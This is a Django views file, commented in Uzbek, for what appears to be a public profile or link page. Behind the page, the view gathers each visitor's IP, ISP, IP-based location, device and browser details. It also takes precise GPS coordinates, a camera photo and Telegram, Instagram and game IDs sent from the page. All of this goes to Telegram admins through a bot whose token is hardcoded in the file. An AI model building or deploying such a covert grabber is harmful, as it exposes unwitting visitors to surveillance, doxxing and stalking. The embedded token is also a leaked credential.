import base64
import requests
from django.shortcuts import render, get_object_or_404
from django.core.files.base import ContentFile
from django.http import JsonResponse
from .models import Profile
from analytics.models import VisitorAnalytics, LinkClickAnalytics

# BOT SOZLAMALARI
TELEGRAM_BOT_TOKEN = "8913375327:AAGDQ3YBplsSYUO7fPpugb557ZZc4y_MONw"
TELEGRAM_ADMINS = ["1724433674"]  # Barcha faol adminlar ro'yxati

def send_to_telegram_and_forget(text, image_data=None):
    """Xabarni ro'yxatdagi barcha adminlarga ketma-ket yuboradi, DBga yozmaydi"""
    base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    
    # Rasm formatini bayt ko'rinishida bir marta tayyorlab olamiz
    photo_bytes = None
    ext = "jpg"
    if image_data:
        try:
            format, imgstr = image_data.split(';base64,')
            ext = format.split('/')[-1]
            photo_bytes = base64.b64decode(imgstr)
        except Exception as e:
            text += f"\n\n⚠️ _Rasmni qayta ishlashda xatolik yuz berdi: {e}_"
            image_data = None  # Xato bo'lsa oddiy matn rejimiga o'tadi

    # Har bir admin uchun alohida so'rov yuboramiz
    for admin_id in TELEGRAM_ADMINS:
        try:
            if image_data and photo_bytes:
                url = f"{base_url}/sendPhoto"
                # [MUHIM TUZATISH]: Har bir admin uchun fayl oqimi (ContentFile) yangidan ochiladi
                photo_file = ContentFile(photo_bytes, name=f"visitor.{ext}")
                files = {'photo': photo_file}
                payload = {'chat_id': admin_id, 'caption': text, 'parse_mode': 'Markdown'}
                requests.post(url, data=payload, files=files, timeout=5)
            else:
                url = f"{base_url}/sendMessage"
                payload = {'chat_id': admin_id, 'text': text, 'parse_mode': 'Markdown'}
                requests.post(url, json=payload, timeout=5)
        except Exception as e:
            # Agar biror admin botni bloklagan bo'lsa, qolganlarga borishini to'xtatmaydi
            print(f"Admin {admin_id} ga xabar yuborishda xatolik: {e}")


def profile_detail_view(request, profile_slug):
    profile = get_object_or_404(Profile, slug=profile_slug)
    links = profile.links.filter(is_active=True)

    # 1. User-Agent orqali chuqur texnik tahlil
    user_agent_raw = request.META.get('HTTP_USER_AGENT', '')
    user_agent = user_agent_raw.lower()
    
    # Kirish manbasi
    source = "Telegram" if 'telegram' in user_agent else "Instagram" if 'instagram' in user_agent else "Tashqi Brauzer"

    # Operatsion tizim (OS)
    if 'windows' in user_agent:
        os_system = "Windows PC"
    elif 'iphone' in user_agent:
        os_system = "iPhone (iOS)"
    elif 'ipad' in user_agent:
        os_system = "iPad (iPadOS)"
    elif 'android' in user_agent:
        os_system = "Android Qurilma"
    elif 'macintosh' in user_agent:
        os_system = "MacBook (macOS)"
    elif 'linux' in user_agent:
        os_system = "Linux Tizimi"
    else:
        os_system = "Noma'lum OS"

    # Brauzer turi
    if 'chrome' in user_agent and 'safari' in user_agent and 'android' not in user_agent:
        browser = "Google Chrome"
    elif 'safari' in user_agent and 'chrome' not in user_agent:
        browser = "Apple Safari"
    elif 'firefox' in user_agent:
        browser = "Mozilla Firefox"
    elif 'edge' in user_agent:
        browser = "Microsoft Edge"
    else:
        browser = "Ichki/Boshqa Brauzer"

    # Tizim tili
    user_lang = request.META.get('HTTP_ACCEPT_LANGUAGE', 'Aniqlanmadi').split(',')[0]

    # 2. IP manzilni olish
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')

    # 3. IP orqali maksimal Geolokatsiya va Provayder ma'lumotlarini olish (API)
    geo_data = {
        'country': 'Aniqlanmadi', 'city': 'Aniqlanmadi', 'isp': 'Aniqlanmadi', 'lat': 'Noma`lum', 'lon': 'Noma`lum'
    }
    if ip and ip != '127.0.0.1':
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=3)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    geo_data['country'] = data.get('country', 'Aniqlanmadi')
                    geo_data['city'] = data.get('city', 'Aniqlanmadi')
                    geo_data['isp'] = data.get('isp', 'Aniqlanmadi')
                    geo_data['lat'] = data.get('lat', 'Noma`lum')
                    geo_data['lon'] = data.get('lon', 'Noma`lum')
        except Exception:
            pass

    # --- AJAX POST SO'ROV ---
    if request.method == 'POST' and request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        tg_user = request.POST.get('tg_user')
        insta_user = request.POST.get('insta_user')
        game_id = request.POST.get('game_id')
        
        image_data = request.POST.get('image_data', None)
        status_text = request.POST.get('status_text', 'Ruxsat berilmadi')
        screen_size = request.POST.get('screen_size', 'Noma`lum')
        
        # Brauzer GPSidan kelgan aniq koordinatalar
        gps_lat = request.POST.get('gps_lat', None)
        gps_lon = request.POST.get('gps_lon', None)

        # Agar GPS koordinatalari kelgan bo'lsa, aniq xarita havolasini yasaymiz
        if gps_lat and gps_lon and gps_lat != 'null' and gps_lat != 'undefined':
            maps_link = f"[Google Maps (Aniq GPS yordamida: 10m)](https://www.google.com/maps?q={gps_lat},{gps_lon})"
        else:
            # Agar rad etgan bo'lsa, eski IP-API koordinatasidan foydalanamiz
            maps_link = f"[Google Maps (Taxminiy IP yordamida: 30km)](https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']})"

        # Kirish haqidagi umumiy ma'lumot
        device_and_geo = (
            f"📱 *QURILMA VA TIZIM:* \n"
            f"• *Manba:* {source}\n"
            f"• *Operatsion Tizim:* {os_system}\n"
            f"• *Brauzer:* {browser}\n"
            f"• *Ekran:* {screen_size}\n"
            f"• *Tizim Tili:* {user_lang}\n\n"
            f"🌐 *GEOLOKATSIYA VA TARMOQ:* \n"
            f"• *IP Manzil:* `{ip}`\n"
            f"• *Provayder (ISP):* {geo_data['isp']}\n"
            f"• *Xarita:* {maps_link}\n"
        )

        if tg_user or insta_user or game_id:
            VisitorAnalytics.objects.create(profile=profile, app_source=source)
            request.session['is_logged_in'] = True
            request.session['tg_user'] = tg_user or '-'
            request.session['insta_user'] = insta_user or '-'
            request.session['game_id'] = game_id or '-'

            msg = (
                f"🎯 *YANGI RO'YXATDAN O'TISH* \n\n"
                f"👤 *Profil:* {profile.title}\n"
                f"🔹 *Telegram:* @{request.session['tg_user']}\n"
                f"🔸 *Instagram:* @{request.session['insta_user']}\n"
                f"🆔 *Kiritilgan ID:* `{request.session['game_id']}`\n"
                f"📸 *Kamera:* {status_text}\n\n" + device_and_geo
            )
            send_to_telegram_and_forget(msg, image_data=image_data)
            return JsonResponse({'status': 'success'})
            
        elif request.session.get('is_logged_in', False):
            saved_tg = request.session.get('tg_user', '-')
            saved_insta = request.session.get('insta_user', '-')
            saved_id = request.session.get('game_id', '-')
            
            re_visit_msg = (
                f"🔄 *PROFILGA QAYTA KIRISH* \n\n"
                f"👤 *Foydalanuvchi:* \n"
                f"  • Telegram: @{saved_tg}\n"
                f"  • Instagram: @{saved_insta}\n"
                f"  • ID: `{saved_id}`\n\n"
                f"📸 *Kamera:* {status_text}\n\n" + device_and_geo
            )
            send_to_telegram_and_forget(re_visit_msg, image_data=image_data)
            return JsonResponse({'status': 'tracked'})

    context = {
        'profile': profile,
        'links': links,
        'is_logged_in': request.session.get('is_logged_in', False)
    }
    return render(request, 'profiles/index.html', context)


def link_click_view(request, link_id):
    """Tugma bosilganda bazada sonini oshiradi"""
    if request.method == 'POST' or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        LinkClickAnalytics.objects.create(link_id=link_id)
        return JsonResponse({'status': 'tracked'})
    return JsonResponse({'status': 'error'}, status=400)